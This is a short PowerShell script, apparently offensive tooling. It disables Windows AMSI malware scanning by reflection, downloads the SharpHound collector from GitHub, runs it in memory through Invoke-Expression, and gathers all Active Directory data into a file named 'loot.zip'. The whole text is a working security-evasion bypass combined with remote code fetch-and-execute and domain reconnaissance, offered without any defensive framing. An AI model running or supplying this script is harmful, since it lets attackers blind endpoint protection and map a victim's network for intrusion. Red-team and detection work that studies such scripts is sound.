$flags = [System.Reflection.BindingFlags] "NonPublic,Static"
$amsiUtils = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
$field = $amsiUtils.GetField("amsiInitFailed", $flags)
$field.SetValue($null, $true)

$sharphoundUrl = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"
$sharphoundCode = Invoke-WebRequest -Uri $sharphoundUrl -UseBasicParsing | Select-Object -ExpandProperty Content

Invoke-Expression $sharphoundCode

Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
